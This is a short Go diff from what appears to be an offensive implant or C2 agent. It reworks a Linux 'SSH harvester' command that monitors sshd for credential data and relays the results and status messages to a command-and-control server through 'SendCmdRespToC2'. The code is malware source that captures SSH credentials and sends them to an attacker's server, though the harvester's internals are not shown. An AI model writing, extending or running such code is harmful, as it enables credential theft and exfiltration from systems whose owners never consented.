@@ -4,7 +4,6 @@
 package agent
 
 import (
-	"context"
 	"encoding/hex"
 	"fmt"
 	"log"
@@ -119,16 +118,9 @@ func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
 		SendCmdRespToC2(fmt.Sprintf("Error parsing hex string: %v", err), cmd, args)
 		return
 	}
-	if SshHarvesterCtx == nil {
-		SshHarvesterCtx, SshHarvesterCancel = context.WithCancel(context.Background())
+	if sshHarvesterRunning {
+		SendCmdRespToC2("SSH harvester is already running", cmd, args)
+	} else {
+		go ssh_harvester(cmd, codePatternBytes, regName)
 	}
-	harvesterLogStream := make(chan string, 4096)
-	go sshd_monitor(harvesterLogStream, codePatternBytes, regName)
-	go func() {
-		for SshHarvesterCtx.Err() == nil {
-			out := <-harvesterLogStream
-			SendCmdRespToC2(out, cmd, args)
-		}
-		SendCmdRespToC2("SSH harvester log stream exited", cmd, args)
-	}()
 }
